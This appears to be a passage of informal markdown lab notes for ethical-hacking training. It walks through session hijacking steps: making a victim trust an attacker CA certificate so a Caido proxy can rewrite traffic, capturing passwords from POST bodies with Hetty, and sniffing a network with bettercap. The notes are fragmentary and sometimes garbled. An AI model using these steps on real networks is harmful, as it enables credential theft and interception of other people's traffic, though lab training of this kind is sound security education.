  :~$ in another system 
  Open Firefox web browser and navigate to http://10.10.1.11:8080/ca.crt.
  to download the certificate
  Firefox web browser, select Settings 
  earch for Certificates and open View Certificates.
   Authorities tab and click on Import…
Select File containing CA certificate(s) to import
When prompted, click the Trust this CA to identify websites checkbox and click on OK
On the Settings page, search for proxy and open
back to caido
On the Requests tab, for all www.moviescope.com requests, modify www.moviescope.com to www.goodshopping.com in all the captured GET requests and Forward all the requests.
switch back to victim tab and do this until victim see different website
```
</details>

<details>
<summary>Intercept HTTP Traffic using Hetty</summary>

* hetty
```console
:~$ open ceh tool and install hetti tool
in same system web browser
http://localhost:8080
and give a name '
open proxy page from left 3 line
and add the proxy of attacker ip and port 8080
and vist the website and return to attacker machine you can see the passwor enterd in post packet under body
```
</details>


<details>
<summary>Detect session hijacking using Wireshark</summary>

* wireshark
```console
:~$open wireshark as a victim
back to parrot
and open bettercap by
bettercap -iface eth0
there help
and on the module by
net.probe on
 net.recon on
 net.sniff on
 bettercap sends several ARP broadcast requests to the hosts
 ```
 </details>
